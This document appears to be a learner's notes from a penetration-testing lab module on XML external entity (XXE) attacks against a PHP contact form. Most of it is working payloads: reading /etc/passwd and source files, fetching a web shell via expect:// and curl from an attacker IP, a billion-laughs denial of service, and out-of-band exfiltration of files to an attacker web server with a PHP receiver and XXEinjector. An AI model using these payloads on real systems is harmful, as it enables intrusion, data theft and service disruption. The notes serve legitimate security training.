# Local File Disclosure

## Identifying

- The first step in identifying potential XXE vulnerabilities is finding web pages that accept an XML user input

![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/134/web_attacks_xxe_identify.jpg)

- If we fill the contact form and click on `Send Data`, then intercept the HTTP request with Burp, we get the following request

![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/134/web_attacks_xxe_response.jpg)

- the email get printed so it's vulnerable to xxe

- we use this payload to read files 

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/134/web_attacks_xxe_external_entity.jpg)

- reading source code with

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

## Remote Code Execution with XXE

- we use this payload to upload a web shell

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

## Other XXE Attacks

- Denial of Service

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```

# Advanced File Disclosure

## Advanced Exfiltration with CDATA

- we put this file in ower machine as and open a web server

```dtd
<!ENTITY joined "%begin;%file;%end;">
```

```sh
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

- Now, we can reference our external entity (`xxe.dtd`)

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

## Error Based XXE

- we will reference a non-existing entity

![](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/134/web_attacks_xxe_cause_error.jpg)

- we cause the web application to display an error, and it also revealed the web server directory
- for further exploitation we will use this payload

```dtd
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

# Blind Data Exfiltration

- Instead of having the web application output our `file` entity to a specific XML entity, we will make the web application send a web request to our web server with the content of the file we are reading.

- we will save this as xxe.dtd

```dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

- PHP script that automatically detects the encoded file content, decodes it

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

- then we start the php server 

```sh
php -S 0.0.0.0:8000
```

- now we will use this payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/134/web_attacks_xxe_blind_request.jpg)

- here we get the data in ower web server 

```sh
PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
10.10.14.16:46256 Accepted
10.10.14.16:46256 [200]: (null) /xxe.dtd
10.10.14.16:46256 Closing
10.10.14.16:46258 Accepted

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```

# Automated OOB Exfiltration

- we can use this automated tool : https://github.com/enjoiz/XXEinjector
- we can copy the HTTP request from Burp and write it to a file , We should not include the full XML data, only the first line, and write `XXEINJECT`

```sh
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

- basic usage 

```sh
ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

- all exfiltrated files get stored in the `Logs` folder under the tool

```sh
 cat Logs/10.129.201.94/etc/passwd.log 
```

